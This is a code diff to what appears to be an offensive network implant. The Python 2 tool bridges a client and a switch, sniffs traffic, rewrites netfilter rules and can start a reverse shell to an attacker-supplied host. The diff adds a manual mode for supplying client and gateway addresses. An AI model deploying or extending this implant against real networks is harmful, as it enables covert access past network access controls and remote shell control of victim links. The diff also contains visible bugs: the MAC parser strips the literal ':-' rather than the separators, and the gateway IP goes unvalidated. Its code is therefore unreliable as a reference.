@@ -11,6 +11,7 @@ import subprocess
 import struct
 import re
 from threading import Thread
+from array import array
 import socket
 
 import pcapy
@@ -40,7 +41,8 @@ class SignalHandler():
     def signal_handler(self, signal, frame):
         if self.shell:
             self.shell.stop()
-        self.decoder.stop()
+        if self.decoder:
+            self.decoder.stop()
         self.bridge.destroy()
         self.netfilter.reset()
         os.system("mv /etc/resolv.conf.orig /etc/resolv.conf")
@@ -291,6 +293,7 @@ class Subnet:
     dnsip = ""
     subnetmask = None
     dhcp = False
+    manual = False
 
     def registeraddress(self, ip_array):
         if self.printip(ip_array) == "0.0.0.0":
@@ -330,7 +333,7 @@ class Subnet:
         return socket.inet_ntoa(struct.pack("!I", addr))
 
     def getcidr(self):
-        if self.dhcp and self.subnet:
+        if self.dhcp and self.subnet or self.manual:
             return bin(self.ip2int(self.printip(self.subnetmask))).count("1")
         else:
             if self.maxaddress and self.minaddress:
@@ -343,6 +346,9 @@ class Subnet:
                 return bits
             else:
                 return 0
+
+    def mac2array(self, addr):
+        return array('B', re.sub(r':-', '', addr).decode('hex'))
 
     def get_gatewaymac(self):
         ethernet = impacket.ImpactPacket.Ethernet()
@@ -359,10 +365,11 @@ class Subnet:
         output = ""
 
         output += "dhcp seen: %s\n" % str(self.dhcp)
+        output += "manual mode: %s\n" % str(self.manual)
 
         if not self.dhcp and self.minaddress and self.maxaddress:
             output += "cidr bits: %i\n" % self.getcidr()
-        elif self.dhcp and self.subnet:
+        elif self.dhcp and self.subnet or self.manual:
             output += "subnet: %s / netmask: %s / cidr: %i\n" % \
                       (self.printip(self.subnet), self.printip(self.subnetmask), self.getcidr())
 
@@ -536,10 +543,14 @@ class Bridge:
             return False
         return interface
 
-    def setinterfacesides(self):
-        self.switchsideint = self.srcmac2bridgeint(self.subnet.get_gatewaymac())
+    def setinterfacesides(self, switch=None, client=None):
+        if switch and client:
+            self.switchsideint = switch
+            self.clientsiteint = client
+        else:
+            self.switchsideint = self.srcmac2bridgeint(self.subnet.get_gatewaymac())
+            self.clientsiteint = self.srcmac2bridgeint(self.subnet.get_clientmac())
         print "switchside interface: %s - %s" % (self.switchsideint, self.ifmacs[self.switchsideint])
-        self.clientsiteint = self.srcmac2bridgeint(self.subnet.get_clientmac())
         print "clientside interface: %s - %s" % (self.clientsiteint, self.ifmacs[self.clientsiteint])
 
     def up(self):
@@ -578,24 +589,49 @@ def main():
         shell = ReverseShell(args.rev_host, args.rev_password, args.rev_sleep)
 
     bridge.up()
-    decoder = DecoderThread(bridge, subnet, arptable)
+
+    decoder = None
+    if not manual:
+        decoder = DecoderThread(bridge, subnet, arptable)
 
     sig = SignalHandler(shell, decoder, bridge, netfilter)
 
-    decoder.start()
+    if manual:
+        subnet.manual = True
+        subnet.clientmac = subnet.mac2array(args.cmac)
+        subnet.clientip = args.cip
+        subnet.gatewaymac = subnet.mac2array(args.gmac)
+        subnet.gatewayip = args.gip
+        subnet.subnetmask = subnet.ip2array(args.mask)
+        net = subnet.int2ip(subnet.ip2int(args.cip) & subnet.ip2int(args.mask))
+        subnet.subnet = subnet.ip2array(net)
+        switchif = [i for i in args.ifaces if i != args.cif][0]
+        bridge.setinterfacesides(client=args.cif, switch=switchif)
+        if args.dip:
+            subnet.dnsip = args.dip
+    else:
+        decoder.start()
+
     if args.rev_host:
         shell.start()
 
+    if decoder:
+        net = decoder.pcap.getnet()
+
     print "Listening on %s: net=%s, mask=%s, linktype=%d" % \
-          (bridge.bridgename, decoder.pcap.getnet(), decoder.pcap.getmask(), decoder.pcap.datalink())
+          (bridge.bridgename,
+           decoder.pcap.getnet()   if decoder else net,
+           decoder.pcap.getmask()  if decoder else args.mask,
+           decoder.pcap.datalink() if decoder else -1)
 
     while True:
         #TODO: what if there's no gw??!!
         if subnet.clientip and subnet.clientmac \
-           and subnet.gatewayip and subnet.gatewaymac:
+           and subnet.gatewayip and subnet.gatewaymac \
+           or subnet.manual:
             print subnet
-
-            bridge.setinterfacesides()
+            if not subnet.manual:
+                bridge.setinterfacesides()
             if not args.radiosilence:
                 netfilter.updatetables()
             else:
@@ -664,7 +700,27 @@ if __name__ == '__main__':
                         default=['eth1', 'eth2'],
                         help='Unordered list of two interfaces. If not set '
                              'the default "eth1 eth2" is used.')
+    manual_group = parser.add_argument_group('manual',
+                                             'Disable auto discovery and manually specify network information. '
+                                             'When using these parameters, all fields are mandatory except the DNS IP.')
+    manual_group.add_argument('--cif', help='Interface where client is connected e.g. eth1')
+    manual_group.add_argument('--cip', help='Client IP Address')
+    manual_group.add_argument('--cmac', help='Client MAC Address')
+    manual_group.add_argument('--gip', help='Gateway IP Address')
+    manual_group.add_argument('--gmac', help='Gateway MAC Address')
+    manual_group.add_argument('--mask', help='Netmask')
+    manual_group.add_argument('--dip', help='DNS IP Address (optional)')
+
     args = parser.parse_args()
+
+    manual = False
+    if any([args.cif, args.cmac, args.cip, args.gmac, args.mask, args.dip]):
+        if not all([args.cif, args.cmac, args.cip, args.gmac, args.mask]):
+            parser.error('You can only specify ALL manual parameters or NONE but not just SOME.')
+        if not args.cif in args.ifaces:
+            parser.error('Client interface %s is not in ifaces list: %s' %
+                         (args.cif, ','.join(args.ifaces)))
+        manual = True
 
     for iface in args.ifaces:
         if re.search('does not exist', cmd("ip link show %s" % iface)):
